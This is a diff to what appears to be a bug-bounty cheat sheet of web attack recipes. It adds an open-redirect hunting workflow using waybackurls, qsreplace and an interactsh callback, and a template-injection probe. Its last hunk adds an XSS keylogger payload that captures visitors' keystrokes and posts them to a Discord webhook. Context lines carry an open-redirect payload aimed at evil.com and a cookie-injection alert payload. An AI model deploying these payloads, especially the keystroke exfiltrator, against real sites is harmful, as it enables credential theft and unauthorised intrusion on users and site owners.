@@ -319,6 +319,16 @@ echo "http://tesla.com" | waybackurls | -silent -timeout 2 -threads 100 | gf red
 poc: redirect_to=////evil%E3%80%82com
 
 
+Easy Open Redirect in 10 min.
+
+1)Collect all urls through waybackurls,gau,etc.
+2)Run this command.
+cat urls | grep "=" | qsreplace <your interactsh-client> >redirect.txt
+3)Run interactsh and then 
+cat redirect.txt | httpx -fr
+4)Check the interactsh-client terminal.
+
+
 ...................................................................................
 apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514
 
@@ -363,6 +373,12 @@ document.cookie="SESSIONID=12345;%20path=/;
    
    try to login with invalid password 10 times and then go with valid password if your account was not locked the you can do brute force attack 
  
+ 
+ ssti 
+/email/optout?username={{7*'7'}}
+
+if output is 49 then vulnerable and vice versa
+
  
  
  
@@ -557,7 +573,7 @@ Host: example.com
 Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
 
 
-
+<img src onerror='let x=!1,l="";document.onkeypress=function(a){l+=a.key,x=!0},setInterval(()=>{x&&(fetch("//discord.com/api/webhook/...",{method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:l})}),x=!1)},1e3);'>
 
 ------------------------------------------------------------
 IDOR :: 
